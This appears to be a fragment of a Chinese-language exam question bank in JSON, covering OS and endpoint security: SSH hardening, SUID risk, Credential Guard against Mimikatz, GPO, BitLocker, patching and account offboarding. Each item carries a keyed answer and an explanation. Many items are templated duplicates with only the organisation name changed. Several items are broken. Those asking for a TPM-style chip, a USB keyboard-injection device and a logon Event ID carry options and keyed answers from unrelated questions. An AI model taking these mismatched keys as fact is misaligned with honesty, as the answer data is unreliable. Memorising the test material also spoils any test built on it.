      "A. 關閉所有事件檢視器以節省磁碟空間",
      "B. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄",
      "C. 關閉防火牆日誌",
      "D. 僅記錄檔案刪除事件"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-269",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "B. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "C. 關閉主機防火牆以減少阻斷",
      "D. 允許空密碼（PermitEmptyPasswords yes）以利快速連線"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-270",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某跨國金融控股銀行遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. Windows Defender Credential Guard（憑證保護）與 LSA Protection",
      "B. 停用 UAC（使用者帳戶控制）",
      "C. 關閉 Windows Defender 防毒",
      "D. 開放 Guest 訪客帳號"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-271",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某公務機關資訊處內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "B. 撰寫批次檔由每位員工自行點擊執行",
      "C. 手動至每台電腦修改本機註冊表",
      "D. 透過電子郵件寄送使用手冊"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-272",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 該檔案會自動刪除",
      "B. 該檔案將自動加密無法執行",
      "C. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "D. 該檔案僅有 root 可以讀取"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-273",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 修改預設管理員名稱並設置強密碼",
      "B. 關閉無用連接埠並停用未使用的系統服務",
      "C. 移除系統中預設之範例檔案與測試資料庫",
      "D. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-274",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "B. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新",
      "C. 等待半年後下一次大改版再行考慮",
      "D. 忽視原廠修補程式，自行修改二進位執行檔"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-275",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 僅移除電子郵件權限，保留 VPN 連線權限",
      "B. 讓其繼續保留帳號 90 天以利接交",
      "C. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備",
      "D. 將其密碼變更為 123456 並轉交給其他同事繼續共用"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-276",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 僅在桌面資料夾設置密碼壓縮檔",
      "B. 安裝傳統特徵碼防毒軟體",
      "C. 設定 Windows 登入密碼",
      "D. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-277",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 每日由警衛搜查員工背包",
      "B. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "C. 貼上防拆貼紙要求員工自律",
      "D. 拔掉機殼電源線"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-278",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
      "A. 關閉所有事件檢視器以節省磁碟空間",
      "B. 關閉防火牆日誌",
      "C. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄",
      "D. 僅記錄檔案刪除事件"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-279",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "B. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "C. 關閉主機防火牆以減少阻斷",
      "D. 允許空密碼（PermitEmptyPasswords yes）以利快速連線"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-280",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某公務機關資訊處遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. 關閉 Windows Defender 防毒",
      "B. 開放 Guest 訪客帳號",
      "C. 停用 UAC（使用者帳戶控制）",
      "D. Windows Defender Credential Guard（憑證保護）與 LSA Protection"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-281",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. 手動至每台電腦修改本機註冊表",
      "B. 撰寫批次檔由每位員工自行點擊執行",
      "C. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "D. 透過電子郵件寄送使用手冊"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-282",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 該檔案僅有 root 可以讀取",
      "B. 該檔案會自動刪除",
      "C. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "D. 該檔案將自動加密無法執行"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-283",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 關閉無用連接埠並停用未使用的系統服務",
      "B. 修改預設管理員名稱並設置強密碼",
      "C. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "D. 移除系統中預設之範例檔案與測試資料庫"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-284",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "B. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新",
      "C. 等待半年後下一次大改版再行考慮",
      "D. 忽視原廠修補程式，自行修改二進位執行檔"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-285",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備",
      "B. 僅移除電子郵件權限，保留 VPN 連線權限",
      "C. 讓其繼續保留帳號 90 天以利接交",
      "D. 將其密碼變更為 123456 並轉交給其他同事繼續共用"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-286",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 安裝傳統特徵碼防毒軟體",
      "B. 僅在桌面資料夾設置密碼壓縮檔",
      "C. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）",
      "D. 設定 Windows 登入密碼"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-287",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某跨國金融控股銀行為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 每日由警衛搜查員工背包",
      "B. 拔掉機殼電源線",
      "C. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "D. 貼上防拆貼紙要求員工自律"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-288",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
      "A. 關閉防火牆日誌",
      "B. 關閉所有事件檢視器以節省磁碟空間",
      "C. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄",
      "D. 僅記錄檔案刪除事件"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-289",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "B. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "C. 關閉主機防火牆以減少阻斷",
      "D. 允許空密碼（PermitEmptyPasswords yes）以利快速連線"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-290",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. Windows Defender Credential Guard（憑證保護）與 LSA Protection",
      "B. 關閉 Windows Defender 防毒",
      "C. 開放 Guest 訪客帳號",
      "D. 停用 UAC（使用者帳戶控制）"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-291",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "在 Windows Active Directory 網域環境中，用以對電腦與使用者統一派發安全組態與組態原則之核心機制為：",
    "options": [
      "A. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "B. 撰寫批次檔由每位員工自行點擊執行",
      "C. 手動至每台電腦修改本機註冊表",
      "D. 透過電子郵件寄送使用手冊"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-292",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "在 Linux 檔案權限設定中，當可執行檔設定了 SUID（Set User ID）特殊權限位元時，該檔案在執行時之權限為何？",
    "options": [
      "A. 該檔案僅有 root 可以讀取",
      "B. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "C. 該檔案會自動刪除",
      "D. 該檔案將自動加密無法執行"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-293",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "下列何者「不屬於」作業系統基準安全強化（OS Hardening）的標準作業項目？",
    "options": [
      "A. 關閉無用連接埠並停用未使用的系統服務",
      "B. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "C. 移除系統中預設之範例檔案與測試資料庫",
      "D. 修改預設管理員名稱並設置強密碼"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-294",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "在企業修補程式管理（Patch Management）生命週期中，修補程式在正式佈署至全公司生產環境前，絕對不可省略的關鍵步驟為：",
    "options": [
      "A. 等待半年後下一次大改版再行考慮",
      "B. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新",
      "C. 忽視原廠修補程式，自行修改二進位執行檔",
      "D. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-295",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "關於員工離職時之資安控制措施，下列何者最符合安全規範？",
    "options": [
      "A. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備",
      "B. 讓其繼續保留帳號 90 天以利接交",
      "C. 僅移除電子郵件權限，保留 VPN 連線權限",
      "D. 將其密碼變更為 123456 並轉交給其他同事繼續共用"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-296",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "Windows 系統內建之 BitLocker 磁碟加密功能，通常搭配主機板上的何種硬體安全晶片進行金鑰保管與開機完整性校驗？",
    "options": [
      "A. 安裝傳統特徵碼防毒軟體",
      "B. 設定 Windows 登入密碼",
      "C. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）",
      "D. 僅在桌面資料夾設置密碼壓縮檔"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-297",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "下列何種惡意攻擊裝置，外觀看似一般 USB 隨身碟，但插入電腦後會偽裝成人機介面裝置（HID 鍵盤）並極速自動輸入惡意指令？",
    "options": [
      "A. 貼上防拆貼紙要求員工自律",
      "B. 每日由警衛搜查員工背包",
      "C. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "D. 拔掉機殼電源線"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-298",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "在 Windows 安全性事件日誌中，用以記錄「使用者帳戶成功登入」的標準 Event ID 為何？",
    "options": [
      "A. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄",
      "B. 僅記錄檔案刪除事件",
      "C. 關閉防火牆日誌",
      "D. 關閉所有事件檢視器以節省磁碟空間"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-299",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "為防止 SSH 遠端連線遭受中間人攔截或密碼暴力破解，最佳的身份驗證強化機制為：",
    "options": [
      "A. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "B. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "C. 允許空密碼（PermitEmptyPasswords yes）以利快速連線",
      "D. 關閉主機防火牆以減少阻斷"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-300",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": false,
    "question": "微軟作業系統提供的「認證保護（Credential Guard）」技術，係利用下列何種虛擬化安全技術來隔離與保護 LSASS 記憶體密碼密鑰？",
    "options": [
      "A. 開放 Guest 訪客帳號",
      "B. 停用 UAC（使用者帳戶控制）",
      "C. 關閉 Windows Defender 防毒",
      "D. Windows Defender Credential Guard（憑證保護）與 LSA Protection"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-301",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即將備份硬碟插上受害電腦進行還原",
      "B. 立即重新啟動電腦嘗試修復",
      "C. 立即點擊勒索信中的比特幣連結付款",
      "D. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-302",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
